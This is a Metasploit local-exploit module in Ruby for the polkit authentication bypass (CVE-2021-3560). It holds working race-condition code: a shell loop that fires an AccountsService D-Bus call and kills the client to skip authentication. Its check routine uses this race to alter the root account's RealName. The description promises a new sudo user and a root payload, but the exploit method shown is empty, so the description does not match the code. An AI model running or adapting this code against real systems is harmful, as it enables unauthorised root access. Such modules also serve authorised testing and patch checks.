##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Polkit Authentication Bypass',
        'Description' => %q{
          A vulnerability exists within the polkit authorization framework that can be leveraged by a local,
          unprivileged attacker to perform privileged operations. In order to leverage the vulnerability, the attacker
          invokes a method over D-Bus and kills the client process. This will occasionally cause the operation to
          complete without being subjected to all of the necessary authentication.

          The exploit module leverages this to add a new user with a sudo access and a known password. The new account
          is then leveraged to execute a payload with root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Kevin Backhouse',                   # vulnerability discovery and analysis
            'Spencer McIntyre',                  # metasploit module
            'jheysel-r7'                         # metasploit module
          ],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Platform' => ['unix', 'linux'],
        'References' => [
          ['URL', 'https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/'],
          ['URL', 'https://ubuntu.com/security/notices/USN-4980-1'],
          ['CVE', '2021-3560'],
        ],
        'Targets' =>
          [
            [ 'Automatic', {} ],
          ],
        'DefaultTarget' => 0,
        # 'DefaultOptions' => { 'PrependSetgid' => true, 'PrependSetuid' => true, 'WfsDelay' => 10 },
        'DisclosureDate' => '2021-06-03',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options([
      OptString.new('USERNAME', [ true, 'A username to add as root', 'msf' ], regex: /^[a-z_]([a-z0-9_-]{0,31}|[a-z0-9_-]{0,30}\$)$/),
      OptString.new('PASSWORD', [ false, 'A password to add for NewUser (default: random)' ]),
    ])
  end

  def exploit_set_realname(new_realname)
    cmd_exec(<<~SCRIPT
      for i in {1..20}; do
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply
          /org/freedesktop/Accounts/User0
          org.freedesktop.Accounts.User.SetRealName
          string:'#{new_realname}' &
        sleep 0.004s;
        kill $!;
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --print-reply
          /org/freedesktop/Accounts/User0
          org.freedesktop.DBus.Properties.Get
          string:org.freedesktop.Accounts.User
          string:RealName
        | grep "string \\"#{new_realname}\\"";
        if [ $? -eq 0 ]; then
          echo success;
          break;
        fi;
      done
    SCRIPT
    .gsub(/\s+/, ' ')) =~ /success/
  end

  def check
    unless cmd_exec('pkexec --version') =~ /pkexec version (\d+\S*)/
      return CheckCode::Safe('The polkit framework is not installed.')
    end

    # The version as returned by pkexec --version is insufficient to identify whether or not the patch is installed. To
    # do that, the distro specific package manager would need to be queried. See #check_via_version.
    polkit_version = Rex::Version.new(Regexp.last_match(1))

    status = nil
    status ||= check_via_attempt
    status ||= check_via_version
    status ||= CheckCode::Detected("Detected polkit framework version #{polkit_version}.")

    status
  end

  def check_via_attempt
    status = nil
    return status unless !is_root? && command_exists?('dbus-send')

    # This is required to make the /org/freedesktop/Accounts/User0 object_path available.
    dbus_method_call('/org/freedesktop/Accounts', 'org.freedesktop.Accounts.FindUserByName', 'root')
    # Check for the presence of the vulnerability be exploiting it to set the root user's RealName property to a
    # random string before restoring it.
    result = dbus_method_call('/org/freedesktop/Accounts/User0', 'org.freedesktop.DBus.Properties.Get', 'org.freedesktop.Accounts.User', 'RealName')
    if result =~ /variant\s+string\s+"(.*)"/
      old_realname = Regexp.last_match(1)
      if exploit_set_realname(rand_text_alphanumeric(12))
        status = CheckCode::Vulnerable('The polkit framework instance is vulnerable.')
        unless exploit_set_realname(old_realname)
          print_error('Failed to restore the root user\'s orignal \'RealName\' property value')
        end
      end
    end

    status
  end

  def cmd_exec(*args)
    result = super
    result.gsub(/(\e\(B)?\e\[([;\d]+)?m/, '') # remove ANSI escape sequences from the command output
  end

  def check_via_version
    sysinfo = get_sysinfo
    case sysinfo[:distro]
    when 'fedora'
      if sysinfo[:version] =~ /Fedora( release)? (\d+)/
        distro_version = Regexp.last_match(2).to_i
        if distro_version < 20
          return CheckCode::Safe("Fedora version #{distro_version} is not affected (too old).")
        elsif distro_version < 33
          return CheckCode::Appears("Fedora version #{distro_version} is affected.")
        elsif distro_version == 33
          # see: https://bodhi.fedoraproject.org/updates/FEDORA-2021-3f8d6016c9
          patched_version_string = '0.117-2.fc33.1'
        elsif distro_version == 34
          # see: https://bodhi.fedoraproject.org/updates/FEDORA-2021-0ec5a8a74b
          patched_version_string = '0.117-3.fc34.1'
        elsif distro_version > 34
          return CheckCode::Safe("Fedora version #{distro_version} is not affected.")
        end

        result = cmd_exec('dnf list installed "polkit.*"')
        if result =~ /polkit\.\S+\s+(\d\S+)\s+/
          current_version_string = Regexp.last_match(1)
          if Rex::Version.new(current_version_string) < Rex::Version.new(patched_version_string)
            return CheckCode::Appears("Version #{current_version_string} is affected.")
          else
            return CheckCode::Safe("Version #{current_version_string} is not affected.")
          end
        end
      end
    when 'ubuntu'
      result = cmd_exec('apt-cache policy policykit-1')
      if result =~ /\s+Installed: (\S+)$/
        current_version_string = Regexp.last_match(1)
        current_version = Rex::Version.new(current_version_string.gsub(/ubuntu/, '.'))

        if current_version < Rex::Version.new('0.105-26')
          # The vulnerability was introduced in 0.105-26
          return CheckCode::Safe("Version #{current_version_string} is not affected (too old, the vulnerability was introduce in 0.105-26).")
        end

        # See: https://ubuntu.com/security/notices/USN-4980-1
        # The 'ubuntu' part of the string must be removed for Rex::Version compatibility, treat it as a point place.
        case sysinfo[:version]
        when /21\.04/
          patched_version_string = '0.105-30ubuntu0.1'
        when /20\.10/
          patched_version_string = '0.105-29ubuntu0.1'
        when /20\.04/
          patched_version_string = '0.105-26ubuntu1.1'
        when /19\.10/
          return CheckCode::Appears('Ubuntu 19.10 is affected.')
        end
        # Ubuntu 19.04 and older are *not* affected

        if current_version < Rex::Version.new(patched_version_string.gsub(/ubuntu/, '.'))
          return CheckCode::Appears("Version #{current_version_string} is affected.")
        end

        return CheckCode::Safe("Version #{current_version_string} is not affected.")
      end
    end
  end

  def dbus_method_call(object_path, interface_member, *args)
    cmd_args = %w[dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply]
    cmd_args << object_path
    cmd_args << interface_member
    args.each do |arg|
      if arg.is_a? Integer
        cmd_args << "int32:#{arg}"
      elsif arg.is_a? String
        cmd_args << "string:'#{arg}'"
      end
    end

    cmd = cmd_args.join(' ')
    vprint_status("Running: #{cmd}")
    cmd_exec(cmd)
  end

  def exploit; end
end
